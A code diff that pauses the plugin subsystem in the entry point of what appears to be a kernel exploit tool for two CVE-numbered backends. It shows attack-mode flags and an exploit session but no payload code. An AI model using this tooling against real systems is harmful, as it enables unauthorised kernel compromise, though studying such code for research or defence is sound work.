@@ -20,9 +20,11 @@
 
 #include "profile/entry.h"
 #include "backend/cve_2026_43284/entry.hpp"
-#include "plugin/host.hpp"
-#include "plugin/probe.hpp"
-#include "plugin/wire.hpp"
+// USER DIRECTIVE 2026-10-05: plugin paused -> #include "plugin/host.hpp"
+
+#include <optional>
+// USER DIRECTIVE 2026-10-05: plugin paused -> #include "plugin/probe.hpp"
+// USER DIRECTIVE 2026-10-05: plugin paused -> #include "plugin/wire.hpp"
 #include "support/cli.hpp"
 #include "support/fatal_error.hpp"
 #include "support/run_state.hpp"
@@ -58,12 +60,14 @@ int main(int argc, char **argv) {
                     pr_error("--plugin-probe cannot be combined with other flags\n");
                     break;
                 case support::cli::ParseError::ExpectShaRequiresPluginProbe:
-                    pr_error("--expect-sha256 requires --plugin-probe\n");
+                    // USER DIRECTIVE 2026-10-05: plugin paused
+                    // pr_error("--expect-sha256 requires --plugin-probe\n");
                     break;
                 default:
                     pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin> |"
                              " --probe-cve-2026-43284 <ko-path> |"
-                             " --plugin-probe <path.so> [--expect-sha256 <hex>]]"
+                             // USER DIRECTIVE 2026-10-05: plugin paused
+                             // " --plugin-probe <path.so> [--expect-sha256 <hex>]]"
                              " [--allow-dev-target] [--dump-kernel-log <dir>]"
                              " [--force-attack] [--enable-status-record]\n",
                              argv[0]);
@@ -80,12 +84,12 @@ int main(int argc, char **argv) {
             return backend::cve_2026_43284::entry::run_diagnostic(
                     options.probe_module_path);
         }
+        /* USER DIRECTIVE 2026-10-05: plugin paused -> --plugin-probe removed.
         if (options.mode == support::cli::Mode::PluginProbe) {
-            /* S4 P1: read-only plugin description; never registers or runs a
-             * hook and never touches a profile or stdin. */
             return plugin::run_plugin_probe(options.plugin_probe_path,
                                             options.expect_sha256);
         }
+        */
         const bool app_call = options.mode == support::cli::Mode::AppCall;
         const bool force_attack = options.force_attack;
         const bool status_record = options.status_record;
@@ -128,22 +132,22 @@ int main(int argc, char **argv) {
             decoded.terminal = static_cast<uint16_t>(terminal_kind);
         }
 
-        /* S4 P1: the plugin section is validated BEFORE any backend binding.
-         * Shape is canonical (section "plugin" + flattened "<id>.<field>" keys);
-         * a "plugin.<id>" section never reaches here because the owner Section
-         * whitelist rejects it at decode time. Fail-closed: an invalid plugin
-         * entry aborts the run instead of being silently ignored. */
-        plugin::PluginWireEntry plugin_entries[plugin::kMaxPluginsPerDocument]{};
-        const plugin::PluginWireResult plugin_wire = plugin::validate_plugin_wire(
-                decoded, plugin_entries, plugin::kMaxPluginsPerDocument);
-        if (plugin_wire.error != plugin::PluginWireError::None) {
-            pr_error("plugin configuration rejected: %s id=%.*s\n",
-                     plugin::plugin_wire_error_name(plugin_wire.error),
-                     static_cast<int>(plugin_wire.id.size()),
-                     plugin_wire.id.data());
-            throw FatalError{};
-        }
-
+//         /* S4 P1: the plugin section is validated BEFORE any backend binding.
+//          * Shape is canonical (section "plugin" + flattened "<id>.<field>" keys);
+//          * a "plugin.<id>" section never reaches here because the owner Section
+//          * whitelist rejects it at decode time. Fail-closed: an invalid plugin
+//          * entry aborts the run instead of being silently ignored. */
+//         plugin::PluginWireEntry plugin_entries[plugin::kMaxPluginsPerDocument]{};
+//         const plugin::PluginWireResult plugin_wire = plugin::validate_plugin_wire(
+//                 decoded, plugin_entries, plugin::kMaxPluginsPerDocument);
+//         if (plugin_wire.error != plugin::PluginWireError::None) {
+//             pr_error("plugin configuration rejected: %s id=%.*s\n",
+//                      plugin::plugin_wire_error_name(plugin_wire.error),
+//                      static_cast<int>(plugin_wire.id.size()),
+//                      plugin_wire.id.data());
+//             throw FatalError{};
+//         }
+// 
         auto &session = session::g_exploit_session;
         /* Route is backend-internal (ADR-0004 R12): the backend reads it from
          * the bound profile; the selection carries only backend/steps/terminal. */
@@ -189,15 +193,25 @@ int main(int argc, char **argv) {
          * because a mapping must not exist while the PI waiter is alive (R1).
          * Without a plugin section every call below is a no-op and the run stays
          * byte-for-byte today's run. */
-        const plugin::RuntimeBackend plugin_backend =
-                selection.backend == contract::BackendKind::Cve2026_43284
-                        ? plugin::RuntimeBackend::Cve2026_43284
-                        : plugin::RuntimeBackend::Cve2026_43499;
-        plugin::PluginHost plugin_host =
-                plugin::PluginHost::from_document(decoded, plugin_backend);
-        if (plugin_backend == plugin::RuntimeBackend::Cve2026_43284) {
-            (void)plugin_host.open(plugin::WindowState::WaiterClosed);
-        }
+//         /* RUNTIME DISABLE (user directive 2026-10-05; the switch and the
+//          * restore procedure live in plugin/host.hpp). While it is false the
+//          * composition root constructs NO host, opens no window, binds no sink
+//          * and prints no report: the run is exactly the pre-step-3a run, and the
+//          * plugin host code below is inert rather than deleted. */
+//         plugin::PluginHost *plugin_host = nullptr;
+//         std::optional<plugin::PluginHost> plugin_host_storage{};
+//         if constexpr (plugin::kPluginRuntimeEnabled) {
+//             const plugin::RuntimeBackend plugin_backend =
+//                     selection.backend == contract::BackendKind::Cve2026_43284
+//                             ? plugin::RuntimeBackend::Cve2026_43284
+//                             : plugin::RuntimeBackend::Cve2026_43499;
+//             plugin_host_storage.emplace(
+//                     plugin::PluginHost::from_document(decoded, plugin_backend));
+//             if (plugin_backend == plugin::RuntimeBackend::Cve2026_43284) {
+//                 (void)plugin_host_storage->open(plugin::WindowState::WaiterClosed);
+//             }
+//             plugin_host = &*plugin_host_storage;
+//         }
         /* B6/T5 production seam. The orchestrator routes app-call 43284 through
          * Pipeline, but the per-run resources are composition-root facts: the
          * helper.ko module mirror + write plan, the single carrier, the real
@@ -209,7 +223,7 @@ int main(int argc, char **argv) {
          * the same bind so the residency window can dispatch POST_TERMINAL. */
         if (selection.backend == contract::BackendKind::Cve2026_43284) {
             const std::uint8_t bind_error = production.bind(
-                    session, decoded, options.allow_dev_target, &plugin_host);
+                    session, decoded, options.allow_dev_target, nullptr);
             if (bind_error != 0U) {
                 pr_error("cve_2026_43284 production binding failed (%d)\n",
                          static_cast<int>(bind_error));
@@ -221,19 +235,23 @@ int main(int argc, char **argv) {
          * successful early stop (objective already met), not a full run. */
         const pipeline::RunResult result = pipeline::run_orchestrated_pipeline(
             session, selection, decoded, dump_dir, force_attack);
-        /* S4 P1 step 3a: unload before the outcome becomes an exit code, then
-         * emit the accounting once. The registered() gate is what keeps a run
-         * without a plugin section byte-for-byte identical: no report, no new
-         * stdout/stderr bytes, and a host with no entries has nothing to unload.
-         * The report is the same field-structured style as the lkm_window and
-         * registry diagnostics, so the device gate can grep run.plugin. */
-        plugin_host.close();
-        if (plugin_host.registered() > 0u) {
-            const std::string plugin_report = plugin_host.format_diagnostics();
-            (void)std::fputs(plugin_report.c_str(), stdout);
-            (void)std::fflush(stdout);
-        }
-        switch (result.code) {
+//         /* S4 P1 step 3a: unload before the outcome becomes an exit code, then
+//          * emit the accounting once. The registered() gate is what keeps a run
+//          * without a plugin section byte-for-byte identical: no report, no new
+//          * stdout/stderr bytes, and a host with no entries has nothing to unload.
+//          * The report is the same field-structured style as the lkm_window and
+//          * registry diagnostics, so the device gate can grep run.plugin. */
+//         if constexpr (plugin::kPluginRuntimeEnabled) {
+//             if (plugin_host != nullptr) {
+//                 plugin_host->close();
+//                 if (plugin_host->registered() > 0u) {
+//                     const std::string plugin_report = plugin_host->format_diagnostics();
+//                     (void)std::fputs(plugin_report.c_str(), stdout);
+//                     (void)std::fflush(stdout);
+//                 }
+//             }
+//         }
+         switch (result.code) {
             case pipeline::RunCode::Rejected:
                 pr_error("orchestrator rejected the component selection\n");
                 throw FatalError{};
